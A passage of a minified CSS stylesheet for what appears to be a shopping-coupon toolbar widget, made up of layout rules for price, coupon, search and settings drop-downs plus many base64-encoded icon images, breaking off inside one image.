b.ymx,.dypTop9527-sameStyleDrop-icon.ymx{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAn1BMVEXd3d3d3d3d3d3d3d3///8AAAD09PT4uWYECAk9Pz/w8fH99erf4OD98d/74L67vLz3yYiEhYX8yIF0dnf3rk0lJycWGBj39/f9+/Xo6ejt7Obi4+T98uPZ2trT1NT45sWztLWztLT727OusLD/4aydo6f51qT91J2YmZh2eHdlanFnaGn9uFxOT1D4rE72pT7ynjItLS8qKywpKysQEREiCK4aAAAABHRSTlPy59pC0FRzugAAAIpJREFUGNNlz1UOxDAMBNC09TRJacvLzIz3P9sqVknqfNlPsmwLxxad2I6wXOrEtYTgIvl8M88UgmH4hgJ0C8HvTgSMKzCZn65A0EICFFDTBtYozYjXwBmaBsCqBtOUSuFSgT+ivS62i2wSzRjC+Eic3evAQKF83tJUPuKlX6+NZJ7LDV/ae673/h9Y/QiUNuWLZAAAAABJRU5ErkJggg==)}.dypTop9527-sameStyle b.gm,.dypTop9527-sameStyleDrop-icon.gm{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAB0VBMVEX////2Q13nAEv5ev/98f73Ov387Pn4aoPtADz0X5/////zACLrANXjAMffAMHXAKvyAETzAC7zABP+9Pn91+jxAOHtANvlAMr6l7rYALXsAFvyAAL0APb60vH1APD1AO30AOjzqubsgtv2p9f2odHnAM75oMbbALrXALLiIareE6rcAKPYAJ35gZveAJbiAZDiAIvhAIPkAILbAILkAHzoA3XlAG/tAWrpAGbvAGPyDmDuAEzzAEHzAD3wADrzADj0AjPzAB72Ifv/+fr77fj83fj5s/L4tvD4pPD71uz2uOT1seT2tuHwouH5v+DvAN35vNz3sdrznNntGtnxldT2q9PxhNPsdNH5qs/uf8/1m87maM7lOs35p8vxfcTpUsD5mb/uab/dO7/cGb7hM7zfJLzrV7vlNLj0ebfpS7fvcrXkLbHaDrDqP6zlLazzdqrqPKj5gqfpNKbkOqX4eaTgAKPwTaHzWaD5bpjSAJjxSJftNZfoPZTIAJTQAZLpD43pF4zeAIzvRojyNYfvJofoC4fiAobsGYXtI3zmAHndAHH2OW/0IG3pAGreBmnlAGntAGf2NWTwAFn0DVf0Dk71AEn0D0bnADXzACnyAAvtAACq+MFCAAAACnRSTlNJ5+fm5ubm5uRKM9SBBQAAAQpJREFUGNMtyMNiA1EUANBbt/dNMojdoLFt1LZt27ZtfW03PcsDkNs3xueVUGJRsUZZmgOQb9mhzab/UivzYMa3YbfTMhOPL6GoJo0aPO6TxTptg87cX1VZ3SYWQdB/iTVrc9Z51I6WV0goCAePcNXX2jOFEwc65ElAHg6g/lGPFuw6VKGMD7GIfFfY0WLwjNS3147TMmBeI6HQ9dWx/3ahc8hqoyHFRHHgq1sQMDTODk46bcCm3spQhcJz7N1fdrmckGHfBVKHVHiGxqXpC68bOPKJ27/rGBU0n27u3XiBcGnHC7lbYe6lw8athycoUJAfEmfJRyLJxOTP2QBZCgXHZcg3m07Ek4VFf0eOOUT4oZvMAAAAAElFTkSuQmCC)}.dypTop9527-sameStyle b.yhd,.dypTop9527-sameStyleDrop-icon.yhd{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAaVBMVEXkAQ3kAQ3kAQ3kAQ3kAQ3////97u/yhoz//f3+9/j+8/T72NrpLjjnHynmFiHmDxr96er2rbH0mZ7zjZPsSFDlCRX84+T7293609X6zdD6zM/4wcT1n6Twc3nuY2ruXmXsUVnqN0DoIy3hh8HbAAAABHRSTlPm50pJ6bzg4AAAAHpJREFUGNNFzNcWhCAMBFB0iShFrNt3Lf//kZoBYV5gbnIibkLG2H6WZ726Gyp9Pldvx3tDHf8AXhlNRM8ITpmGOJ8IVr10zdBH8M5OWBkA4SY2VIY/cX4ZvoAlwwMwJWgJ2RKsAfYEYwAPYHmj19wLURZy7iqO4Xl5AKNwBsrOpFT/AAAAAElFTkSuQmCC)}.dypTop9527-sameStyle b.jm,.dypTop9527-sameStyleDrop-icon.jm{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAOVBMVEX0G1z0G1z0G1z0G1z////3VIX8xtb6ja71KWb+4uv5f6T7qcL6m7f+8fX4cZn3Y4/2Rnv8t8z1OHDqWPXyAAAAA3RSTlPmSklSjzZ3AAAAaklEQVQY022PWQ6AMAhEVboAXfX+h5VKa2vi+yFDHpOwHRssSJS8ormcCIChgKCC9wAhQl+YBTWGMww7BftriLAor5F5drgG0TO0VOBELGOUIlOt5FFP0DsTLtnG5CK2Z9hCx2bJ+/f9/QY2jwR2aw49WQAAAABJRU5ErkJggg==)}.dypTop9527-sameStyle b.kl,.dypTop9527-sameStyleDrop-icon.kl{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAA3lBMVEXUIUnUIUnWHUbROlzQKlDUIUj////UI0rNACfOACrVJk3RCjbQBjPPAzDttMLJABL24ebvvcnRDTjPAC7rqrnpnq/RDzrMACP13OLyzdbwy9TvuMTsrrzsqbjqp7bspbXqobLkh5zfZIDeX3veWnfUG0PTGEDREzzNACz8+/v59vj27/Hx0djzy9TxyNLxxM7nlafkg5nlfpbkeZHjcYrdVHPbUW7ZUmvVP2DXOl3MACHDAADCAAD66fD25er11t7y09ny0djwwcvpmqzlip/YSmPXQmPVHkfMBjPLACs4mDCNAAAABXRSTlPnSefkSr41UooAAADfSURBVBjTLY9FYsMwAARVEFlgZmaHmVPm/3+obpO9zZ5mwA2AGDNqmpRBDHsEUHHI1pYy21BHgX/M2/DZXi7tF70R/YOd9lFvXUpdR44aAwNMptH5KLpOuOfMJxCwTfCZ5rsk3i7SfVByQN4SH133lGQEmFb+gGYxQtYrGuaxAKZefGjapCgnnrardAFIlJ4wQt8/CCknWxLAKs04LgaeN3h3hVZwAEmgq+SwWh2IKse0FzPqkWRqPx4NIcO9uqhn4/l6Pfen0LzEGLSywtAqO6Nubv/zIaOcUw6/9nf3v6VmGAnI5CHJAAAAAElFTkSuQmCC)}.dypTop9527-sameStyle b.yx,.dypTop9527-sameStyleDrop-icon.yx{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAOVBMVEWtmXWtmXWtmXWtmXXWzLrq5dy8rI+3pob18u7w7OXCs5iyn37////Mv6nl39Tb0sLRxrLHuaDg2ct6b/V9AAAAA3RSTlPmSklSjzZ3AAAAdUlEQVQY02WPWw6FMAhE9cJQWtqqd/+LlYbGR5yEjzk5hLD8FnrEa/QroyfxIWlBHJRs1KXwBWhjq8gKbBMYNabbEID29ABWsrMKVUBiBT6VOJQJUh7gnybwfgygYbQqaC517HFFRTtHYkXIjgnc+D63vt9fT3sHBKmGUbCGAAAAAElFTkSuQmCC)}.dypTop9527-sameStyle b.mgj,.dypTop9527-sameStyleDrop-icon.mgj{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAulBMVEX/AFzrRIv/AG/sBG7u0ebyAFP1AFL/////AXf/AXj/AGX/AHL0A2/7AF/y////AXb9AGD9////AG71AG3/AGv+AFb2///x6/LuYqfqYKL/AHT9AGb5AGX4AF71xt70sdPnerDsbaruU5zqU5zxFHr0C3fvDXP9AGX5AFr4///w9vj08ffx5u3uwNnstdLxoMvxj8LvlMDwkr/udrXuebDvXqPkXqLiXKHuRZPxGX70DHrsAGzsAGL2AFjaZj33AAAAB3RSTlPn5ubmSUpK5CofiwAAALlJREFUGNNNzdcWgjAQRdFYM4MGAoJ0C93eu/7/b5lhqcvzkmQ/5LJ2oz8Y9Ck6G23Wcnp/OS3moAFoSSGEhQDoMA0QZHHa77xMBAga0zCI/aXJuelOYwMJRDrkdUNfENjFnH/Sb7YC6c2+YB6EgmrLf21iBeFV53w1maxNrieSPo3S8fEyGp2nYz8yCKCsngu18XjJgFYA0M51NZHZAECgpExc14ugBoYKIMzvoUE3xjrNWiyrfje7b80oEQPFtqjVAAAAAElFTkSuQmCC)}.dypTop9527-sameStyle b.qt,.dypTop9527-sameStyleDrop-icon.qt{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEX/IU3/IU3+///+4+n/dI/+8fT/g5v/WHk2fSKkAAAAAXRSTlOArV5bRgAAADZJREFUCNdjYBQEAwEGQShAYggpAYEiCkPRSFkIzFApNncCM1QdRYLgaggwxECMREFMu+DOAACRxQzBXwrrwQAAAABJRU5ErkJggg==)}.dypTop9527-sameStyle-price{color:#fe1947;font-weight:700;display:inline-block;max-width:50px;overflow:hidden;margin-left:8px}.dypTop9527-sameStyleDrop{position:absolute;left:-1px;top:36px;padding-top:5px;cursor:default;display:none}.dypTop9527-sameStyleDrop ul{box-sizing:border-box;background-color:#FFF;position:relative;width:403px;max-height:285px;border-left:1px solid #D5D5D5;border-right:1px solid #D5D5D5;border-bottom:2px solid #FF6161;overflow:auto}.dypTop9527-sameStyleDrop ul::-webkit-scrollbar,.dypTop9527-vipCouponDrop ul::-webkit-scrollbar{width:6px}.dypTop9527-sameStyleDrop ul::-webkit-scrollbar-thumb:hover,.dypTop9527-vipCouponDrop ul::-webkit-scrollbar-thumb:hover{background:#666}.dypTop9527-sameStyleDrop ul::-webkit-scrollbar-thumb,.dypTop9527-vipCouponDrop ul::-webkit-scrollbar-thumb{background:#cdcdcd;border-radius:3px}.dypTop9527-sameStyleDrop ul::-webkit-scrollbar-track,.dypTop9527-vipCouponDrop ul::-webkit-scrollbar-track{background:#f0f0f0}.dypTop9527-sameStyleDrop li{border-top:1px dotted #DDD;margin:0 19px!important}.dypTop9527-sameStyleDrop li:first-child{border-color:transparent}.dypTop9527-sameStyleDrop a{display:block;height:80px;color:#5d5d5d}.dypTop9527-sameStyleDrop a:hover .dypTop9527-sameStyleDrop-title{color:#FD2550}.dypTop9527-sameStyleDrop img{width:60px;height:60px;margin:10px 10px 0 0;vertical-align:middle}.dypTop9527-sameStyleDrop-itemR{margin-top:10px;width:287px;height:70px;position:relative}.dypTop9527-sameStyleDrop-title{font-size:12px;color:#4A90E2;line-height:20px;height:40px;display:-webkit-box;overflow:hidden}.dypTop9527-sameStyleDrop-price{font-size:20px;color:#FD2550;line-height:20px}.dypTop9527-sameStyleDrop-sale{font-size:12px;color:#AAA;line-height:12px;margin-top:9px}.dypTop9527-vipCoupon{display:flex;align-items:center;justify-content:center;width:110px;cursor:pointer;box-sizing:border-box;position:relative}.dypTop9527-vipCoupon:hover{background:linear-gradient(#eee,#fff)}.dypTop9527-vipCoupon:hover .dypTop9527-mask{border-color:#fff}.dypTop9527-vipCoupon>b{height:19px;width:24px;margin-right:6px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAATCAMAAAC9bj0JAAAAdVBMVEUAAAD9JlD/JlD/J1H9MFfqOWT/JlH/J1D+JlD+JVD4K1b/J1H7N1f+JVD+J1H+J1L9KFP9KFP9JlD+J1H/JlH+JlH/J1L/K1L+JVD+JVH+JVH+JlD9JlD/J1L/J1L/KFP8KVL+JlD+JlH+JVH9JlH9JVH+JVAwH9bzAAAAJnRSTlMAgGpkDwZ3bvv3C1cJ7ns4IRuLc11MJhPx6OTeklNBLyvYybGpnivUpb0AAAC0SURBVBjTXZBZDoMwDAWfSRPWshUKlLWb73/EEiEXwnzOWJZs/NGTZ7J86NkSGgiRR97l/ljlVsRfVh/NnXVtSiGzeJ9Ukl3ZYoBSQnMjpbN221ICX2bxlZ5C2f958xYKQ7Gurd8JxMcBO7yAPKUR1clzbH0NxScG4EYGzXm+BOBRmiRX15Nz2o7Zj47mQ/GdNy2deIXjY315bFDhQKLWkvfWj3DQa9HFk8MaJ/RSAFF8380PcyognLJ9GUUAAAAASUVORK5CYII=) center center no-repeat}.dypTop9527-vipCoupon>span{font-size:13px;height:40px;line-height:42px;color:#333}.dypTop9527-vipCouponDrop{position:absolute;left:-1px;top:36px;padding-top:5px;cursor:default;display:none}.dypTop9527-vipCouponDrop ul{width:403px;box-sizing:border-box;background-color:#FFF;position:relative;border-left:1px solid #D5D5D5;border-right:1px solid #D5D5D5;border-bottom:2px solid #FF6161;max-height:455px;overflow:auto}.dypTop9527-vipCouponDrop li:first-child{border-color:transparent}.dypTop9527-vipCouponDrop li{border-top:2px solid #DDD;margin:0 19px!important}.dypTop9527-vipCouponDrop a{cursor:pointer;display:block;height:149px;color:#333}.dypTop9527-vipCouponDrop img{width:130px;height:130px;margin:10px 10px 0 0;vertical-align:middle}.dypTop9527-vipCouponDrop-itemR{margin-top:10px;width:217px;height:130px;position:relative}.dypTop9527-vipCouponDrop-title{font-size:14px;line-height:20px;height:40px;display:-webkit-box;overflow:hidden}.dypTop9527-vipCouponDrop-icon{margin-top:4px!important}.dypTop9527-vipCouponDrop-sale{font-size:12px;color:#666;line-height:12px;margin-top:10px}.dypTop9527-vipCouponDrop-price{height:24px;margin-bottom:13px}.dypTop9527-vipCouponDrop-nprice{font-size:18px;color:#FD2550;line-height:18px}.dypTop9527-vipCouponDrop-oprice{font-size:14px;color:#999;line-height:14px;text-decoration:line-through}.dypTop9527-vipCouponDrop-buttl,.dypTop9527-vipCouponDrop-buttr{height:30px;line-height:32px}.dypTop9527-vipCouponDrop-buttl{background-color:#F42651;color:#fff;text-align:center;width:102px}.dypTop9527-vipCouponDrop-buttr{width:114px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAYAAAAeBAMAAAD9Z3KNAAAAElBMVEX0JlH/5BT3U0L8qyb+0Rr6gTRikTRvAAAAJElEQVQI12MgGjCZMDAECjIwCQoyMAMxCwiD2WAxkBxYDZEAAHriAg/SASP5AAAAAElFTkSuQmCC) no-repeat #FFE414;color:#FD2550;text-align:center}.dypTop9527-swiper_wrap{overflow:hidden;margin-right:23px}.dypTop9527-font_inner{position:relative}.dypTop9527-font_inner li{height:40px}.dypTop9527-font_inner a{display:inline-block;color:#333;height:40px;overflow:hidden;max-width:150px;font-size:12px;line-height:42px}.dypTop9527-font_inner a:hover{text-decoration:underline!important;color:#FE1947}.dypTop9527-font_inner b{width:12px;height:40px;margin-right:5px}.dypTop9527-font_inner b.icon3{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAQCAMAAAAVv241AAAAYFBMVEUAAAD+JlH+JVD+JVH/JlT+JVD+JVD+JVH9JlD9JVH9JlH/JlH/J1D/JVP/JlH/LFD/K1j/N1v+JlD+JlH+JlH+JlH+JVH9JVD9JlH/JVL/JVL/KFH/J1j/J2L////+JVAdgIRTAAAAH3RSTlMA7vmsJ/LgtaKYhlNHQDUjEQfl3dHJuqWNZ2A5Gg0B2w05KAAAAGFJREFUCNdFzkcSwCAMQ1EB6b33RPe/ZRJg8F/5jTfCX3RC6nQlaBhHATm5+PMp+OVeveHfcbcfVtr2ZrhQ0VWmzGE8JjJBwpCGFiiMAoNNUKJV9GUAaq+st5uLOVZpDeAFdEcNPWpdiqMAAAAASUVORK5CYII=) center no-repeat}.dypTop9527-search-box{padding:7px 0 0;margin-right:12px;box-sizing:border-box}.dypTop9527-qq-online a{display:block;margin:10px 10px 0 0;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEoAAAAUCAMAAAAdilvEAAAArlBMVEUwsOdY1PNW0/MwsOcwsOdY1PMxsehT0PJPzPH///83tulW0/NJx+9BwO07uuva8Pqz4/fb8/xGw+3k8/uv3vWc2/Tm9v1/zvC+5/i64vbt+P33/P7F5vin4Pb6/f/S7/rP6/nI6/mH2fRUxe5rxO2L0vFmyu+D1PJr0PFvyO9QwOxLu+qO2PSi2PNayu97ye9hxe6q5fiW0/Jdz/Ge4PZ40/JzzvBqwexbvuxHt+neuu2sAAAABnRSTlPn5ublSkmb2EzAAAACBklEQVQ4y62O15KjMBBFmYQHBmjJApGTScY5jj3//2PbCvbUvm1tcWR39VVLBxkfL1+T8PJhvH7NJuHr1ZhNhvGpmR15wY+zz//nqaKWgOp0Pp7PC8lZ5uXvjYusauv4l8pRXCzFRUUe0SshtCbk6kS141BnSZe4XS4WFhHsHB44u5QKAkfyUFGtojJFOf6EQKVoWS6Tq2iH0spzPgxB6ewoIUpCtWoucVKtSh1Mm7IedhyPkiia94TUJY3wgYMYBXNi7eZ1hH2QcnxTNKfKYbiSjfVgg6lv+nrjUjf4xiJIelfRkLJJcjKkzTdpmoDgFsUl0ar8qcrlBcQFl4RYIoCUA1gAlUsS0vDO5fiNPq/cUKgAl1J5gr54qore81ZhGMYjeH7oAU4DhiXLPO8QrIKkwzlgwVEIvu8DNhKlqqxfajWAg1atYgCWALPYuMpS6EKkg2olVL40PlS2oEifprTAPNrb2AY7G21Ys61tx51ts3017sGXxNm4xvnJx7OAS6JU+aHQpuKQY44Z4NF7krWZGK+ZvCKLQjq2FQOA+KkyJXapVaUt84mtzRbaNmkx7KHdm2tmIlgkMf7TTPUnDALDNsUKrAeBzGZ3q+Bumj/sFrPsbsYs2UoFA8kJe7nhVxn7MeUd/aqWF4l/8JOCt6YGD/wLt71uUDUZxttkJuN9one9vf8BupVQ1AFoln4AAAAASUVORK5CYII=) center no-repeat;width:74px;height:20px}.dypTop9527-search{height:26px!important;width:220px;margin:0 auto;display:flex;position:relative;background-color:#f2f2f2}.dypTop9527-search span{width:63px;text-align:center;height:26px;display:inline-block;line-height:28px;position:relative;background:#F03;color:#fff}.dypTop9527-search u.u1,.dypTop9527-search u.u2,.dypTop9527-search ul{background-color:#fff;position:absolute}.dypTop9527-search em{cursor:pointer}.dypTop9527-search i{display:inline-block;position:relative;top:4px;width:0;height:0;border:5px solid transparent;border-top-color:#fff;margin:0 0 0 5px;cursor:pointer}.dypTop9527-search u.u1{display:inline-block;width:10px;height:10px;border:1px solid #dfdfdf;top:30px;left:204px;transform:rotate(-45deg) skew(-10deg,-10deg);z-index:2}.dypTop9527-search u.u2{display:inline-block;width:12px;height:0;border-top:1px solid #fff;top:35px;left:204px;z-index:4}.dypTop9527-search ul{z-index:3;border-radius:4px;box-shadow:2px 2px 6px 0 rgba(0,0,0,.3);padding:6px 0!important;right:-20px;top:36px;width:328px}.dypTop9527-search ul p.p1{left:25%}.dypTop9527-search ul p.p2{left:50%}.dypTop9527-search ul p.p3{left:75%}.dypTop9527-search ul p{position:absolute;height:calc(100% - 20px);width:0;border-left:1px solid #ebebeb;top:10px}.dypTop9527-search li{color:#666;line-height:21px;cursor:pointer;width:59px;float:left;margin-left:23px!important}.dypTop9527-search li:hover{color:#fe1947}.dypTop9527-search input{border:1px solid #F03;height:24px;padding:0 0 0 10px;flex:1 1 auto;color:#545454;background-color:#fff;font-size:12px}.dypTop9527-set-box{position:relative;float:left;height:40px;width:48px;box-sizing:border-box;border-right:1px solid transparent;border-left:1px solid transparent}.dypTop9527-set-lMask{position:absolute;background:#eee;top:6px;left:0;width:2px;height:28px}.dypTop9527-set-box:hover{border-right:1px solid #D5D5D5;border-left:1px solid #D5D5D5}.dypTop9527-set-box:hover .dypTop9527-set-lMask{display:none}.dypTop9527-set-box b{width:48px;height:40px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAMAAADXqc3KAAAAdVBMVEUAAAD+JlD2M13+J1H/J1H/J1H+JlH/J1L+KlH/K1b+JVD+J1D+KlX+JVD+JVD/JlH/JlD/JlL/J1L4NGH+JVD+JVD+JlH9JVH9JlH/JlH9J1D9KFH9J1H/K1b/NFv+JlH9JlL+JlH8K1L+JlD+JlD+JVD+JVDOTB4VAAAAJnRSTlMAgAVBc1FYLiQTx10e9eR9eUQ3CPDrtqWhb2xLMxcOypNkKs/FuHI+ungAAADuSURBVCjPZZGLcoQgDEUTBFfBt+7DXXXbbZv//8RemCkV98wIw70kJIZSVP4gchm9ozkznB/VkUbNAIZKjLyDfvdfNyRGj9snIsPcYduT8R3rxlwdajKssa0+LuETqcy2+u2v4kUmn8nkHHi4AscSCZ0IViSYgw4V+teUZ1bk9mrlptquWtgFYz1LxKrhhYwFBUzU6yJtC9LH0P/A2Hby4ix038QT75j/GPEMBLSA72hMAkI7rYALRaorjgplNyJzSTtOuPjULfRzOgWWSH8IqGsBaLQZ9//6aosS72iVNXM6BRW6L/3M3yjs5aD8AtS2FJGuUjEqAAAAAElFTkSuQmCC) center no-repeat;cursor:pointer}.dypTop9527-setDrop{position:absolute;right:-1px;top:36px;padding-top:5px;margin-left:-1px;display:none}.dypTop9527-setDrop ul{border:1px solid #D5D5D5;border-top:none;background-color:#fff}.dypTop9527-setDrop li{width:80px;text-align:center;cursor:pointer}.dypTop9527-setDrop li:hover{background-color:#eee}.dypTop9527-set-box:hover .dypTop9527-mask{border-color:#fff}.dypTop9527-set i{float:left;width:30px;height:40px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAoBAMAAAAbPVchAAAAElBMVEX09PTe3t7Y2Njv7+/o6Ojh4eFH3xMsAAAAR0lEQVQoz2NQYGIgBQwZ9caoXGZBAxT1hoLCKPKCgoLIXFYgPwBJfSCQL4qQZhEEAQcMPsJ8RkEBmCQ+PmH1CPcPrfAnUj0A3nQGHTuZYVUAAAAASUVORK5CYII=);cursor:pointer}#dai360_link,.dypAbs9527-ad{height:36px;line-height:36px}.dypTop9527-set i:hover{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAoBAMAAAAbPVchAAAALVBMVEX09PT9JVDY2Nj9OWD07e704+f11932xs/2wMv3ucX3sb/4iqD5fZb7U3X8Qmexz/laAAAAVklEQVQoz2NQYGIgBQwZ9R2oXC7BBSjqCwXFkaXZDAWFE5D4cYKCgk8R6lkuAvmyDnBpHkEQOADnc4P5G5DMZxQUgEni5uNRzyxogMLnNJ4wtMKfSPUAgcALGMIUL2sAAAAASUVORK5CYII=)}#dypAbs9527{display:inline-block;position:relative;width:480px;z-index:10}.dypAbs9527-ad{overflow:hidden;border:2px solid #F03;border-radius:0 0 4px 4px;border-top:none;background-color:#fff}#dai360_link{color:#333;font-size:14px;padding-left:30px;border-right:2px solid #F03;cursor:pointer;font-family:"Microsoft Yahei",sans-serif;width:100%;border-radius:0 0 0 6px}#dai360_link>.dai360_title{vertical-align:middle}#dai360_link>.dai360_title>.dai360_logo{display:inline-block;vertical-align:-10px;margin-right:10px;width:52px;height:32px;background:url(data:image/gif;base64,R0lGODlhNAAoAOZWAPEsVfMtVucmTvAsVO4qU/MuV+knUOMkTPItVugnT+soUfArVO0pUuIjS+8rVOQkTOwpUeUlTewpUuknT/IsVeEiStIZQNQaQdEYP+IjSugmTu0qUuooUOYlTeMkS9sfRtccQ9gdRNgcQ9MaQN4gSO8rU/QwWN8hSd0gR9AYPvItVeAhSegmT9keReUkTPU7YvZSdPdriM8XPs8XPfiCmv7s8NkdRO4rU+AiSeMjS9wfR/ZMb9IZP/3V3d8hSOs9YukrU/mNo/qXq9oeRdwfRvqgs/uvv/3U3PU+ZPNDaPzJ1PMwWdUbQuUlTPQ1XNseRdYcQ/3W3vZZevuuvuspUfQuVwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUDw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQwIDc5LjE2MDQ1MSwgMjAxNy8wNS8wNi0wMTowODoyMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDozNzg5ZDk0MC1lZWQ1LTQ2N2MtYmRlNi02ZWY5YzczMTM2NjIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NEFCRDAxQzM3MkQyMTFFODkyNTNCNTNGQkY2MEJENjUiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NEFCRDAxQzI3MkQyMTFFODkyNTNCNTNGQkY2MEJENjUiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OWU5ZTEzZjQtMTNlMy00MjRhLWI4MTAtZmM5NjA0NzczM2I4IiBzdFJlZjpkb2N1bWVudElEPSJhZG9iZTpkb2NpZDpwaG90b3Nob3A6MGQ1MWMxMmItZjAxZS1jODQ5LTg2MzMtNWI0NmY2YWExMzgyIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEgHx4dHBsaGRgXFhUUExIREA8ODQwLCgkIBwYFBAMCAQAAIfkEBQMAVgAsAAAAADQAKAAAB/+AVoKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6Chjg4UCoYlCBCIBBQBVQEDiA4AtLW1sYUJBVULhQKuuIUIVcTFBb2EBFNKPS/FzwEChD9RVQMNhLpVAB6FSUZBsLPFJYNEEjFSOybPxQAuhEA11tiD2gAHhAtFQksSDxUELCAWwMCgChwgsCoWoIQEBR1aEDJwBAaACIQ4EMNnLwANJARwjLASQgAFYgQGWRDR4gQEV1UcPHgi4kIhA05MBGBAyMHGfIIgEJxAiASBjYc0wNyQyABDWzA5Ctqw8UEhoa+k+YLJE5HTdu2kWjlKr5CCYgkM/SLW9dDXVwj04iLYtQ3oWGIDMpgtRnQr26YECWiIEGHCwLqDqG6zSghrAA1quQLe1iGEBQtDziIWpDkAi0JkKcDzW6Wtoa/Xsu0SqxRlIQDEHKyI/Ncr3nqC7tmtcBgBoRu7CiiwQbv05NT2VncTFGLCsFexAMBcgJvQ2ioSEmlbUME6ML2DUCh43m5ABxCHIjynkiiHAxUKPhCqQAAAB/mEdLCo7wrWP/SH+LCBCgs0kQgIGURAQiFMrOABCodAQcIDCUwgQAMfjITIBSdEkIEIimBggQyGpIDBDInwcMEFI2DASAoWuCjKjDTWaOONOOao44489ujjj4wEAgAh+QQJAwBWACwCABUADgAIAAAHEYBWgoOEhYaHiImKi4yNjoeBACH5BAUDAFYALAAAAAA0ACgAAAfTgFaCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+bDhQKhiUIEKCHCQVVC4UCAVUDqYY/UVYDDYSrVgAetIRANYsHwIMGRzAAEYQcVcaGTiYBDIQO0IZV2gEA3QAB2Ija48/hhgEI6QgF5oUBBBoREROu7YMAHSEWFkOk7Qbacu1iBaAYNICydA1aVaUgNoQCFxL8BY3hggqEYMnKgC2HAxUKPhCqQAAAB5HQQGSIQKIQkxUeUJjDYEGGoRQYZtjbybOnz59AgwodSrSoUWiBAAAh+QQJAwBWACwCABQADgAIAAAHEYBWgoOEhYaHiImKi4yNjoeBACH5BAUDAFYALAAAAAA0ACgAAAfTgFaCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnoYOFAqGJQgQn4gJBVULhQIBVQOohz9RVgMNhKpWAB6zhUA1iwe/hAZHMAARhBxVxYdOJgEMhA7Ph1XZAQDcAAHXidnizuCHAQjoCAXlhgEEGhERE63shAAdIRYWQ6P1Btm4dK0CQOzav1i5BqmqQhDcwYAKB/q6tnBBBUKvYmUAl8OBCgUfCFUgAIBDyGsgMkQgUYjJCg8o2GGwIMNQCgwz6uncybOnz59AgwodSrSoUaCBAAAh+QQFAwBWACwAAAAAAQABAAAHA4BWgQAh+QQJAwBWACwCAAkAIAAUAAAHJoBWgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio4qBACH5BAUDAFYALAAAAAA0ACgAAAf/gFaCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+bDhQKhiUIEIgEFAFVAQOZCQVVC4UCrK+GCFW7vAW0lj9RVQMNhLFVAB6FSUZBrg4AvCWWQDXDxYPHAAeEC0